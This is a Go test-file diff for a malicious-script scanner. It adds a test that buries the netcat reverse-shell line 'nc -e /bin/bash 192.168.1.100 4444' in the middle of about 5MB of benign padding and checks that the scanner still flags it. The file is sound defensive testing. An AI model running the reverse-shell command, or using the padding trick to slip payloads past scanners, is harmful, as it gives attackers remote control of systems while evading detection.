@@ -1,6 +1,7 @@
 package scanner_test
 
 import (
+	"bytes"
 	"os"
 	"strings"
 	"testing"
@@ -705,5 +706,53 @@ func TestCheckSuspiciousScriptContent_DualWindowTailEvasion(t *testing.T) {
 		t.Errorf("expected single wrapper to return truncated match, got: %+v", single)
 	}
 }
+
+func TestCheckSuspiciousScriptContent_MiddleOfFileEvasion(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+
+	// Construct a 5MB script with reverse shell planted at offset 2.5MB (dead center)
+	headPadding := bytes.Repeat([]byte("# benign system administration shell configuration parameter\n"), 40000) // ~2.4MB
+	payload := []byte("nc -e /bin/bash 192.168.1.100 4444\n")
+	tailPadding := bytes.Repeat([]byte("# trailing benign application parameters and comments\n"), 45000)      // ~2.5MB
+
+	fullData := make([]byte, 0, len(headPadding)+len(payload)+len(tailPadding))
+	fullData = append(fullData, headPadding...)
+	fullData = append(fullData, payload...)
+	fullData = append(fullData, tailPadding...)
+
+	if len(fullData) < 4*1024*1024 {
+		t.Fatalf("expected payload > 4MB for middle-of-file evasion test, got %d bytes", len(fullData))
+	}
+
+	// Payload is strictly outside the first 1MB and last 1MB
+	payloadOffset := len(headPadding)
+	if payloadOffset < 1024*1024 || (len(fullData)-payloadOffset) < 1024*1024 {
+		t.Fatalf("payload is not in the middle beyond 1MB head/tail windows")
+	}
+
+	matches := scanner.CheckAllSuspiciousScriptContent("/tmp/middle_payload.sh", fullData, nil, cfg)
+	if len(matches) == 0 {
+		t.Fatalf("expected sliding overlapping chunk scanner to detect middle-of-file payload, got 0 matches")
+	}
+
+	found := false
+	for _, m := range matches {
+		if m.Name == "Script_Netcat_Reverse_Shell" {
+			found = true
+			if !m.Truncated {
+				t.Errorf("expected Truncated flag to be true for >2MB script")
+			}
+		}
+	}
+	if !found {
+		t.Errorf("expected Script_Netcat_Reverse_Shell to be detected in sliding middle window, got: %v", matches)
+	}
+
+	single := scanner.CheckSuspiciousScriptContent("/tmp/middle_payload.sh", fullData, nil, cfg)
+	if single == nil || single.Name != "Script_Netcat_Reverse_Shell" {
+		t.Errorf("expected single wrapper to find Script_Netcat_Reverse_Shell, got: %+v", single)
+	}
+}
+
 
 
